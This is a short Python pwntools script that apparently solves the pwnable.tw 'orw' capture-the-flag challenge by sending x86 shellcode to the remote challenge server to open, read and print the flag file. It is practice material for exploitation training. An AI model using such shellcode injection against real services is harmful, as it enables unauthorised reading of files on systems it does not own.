#!/usr/bin/env python3.7

from pwn import *

context(arch='x86')
#r = process('./orw')
r = remote('chall.pwnable.tw', 10001)
r.recvuntil(b':')

shellcode  = b''
shellcode += shellcraft.pushstr(b'/home/orw/flag')
shellcode += shellcraft.open(b'esp', 0, 0)
shellcode += shellcraft.read(b'eax', b'esp', 100)
shellcode += shellcraft.write(1, b'esp', 100)

sh = asm(shellcode)
r.send(sh)

r.interactive()
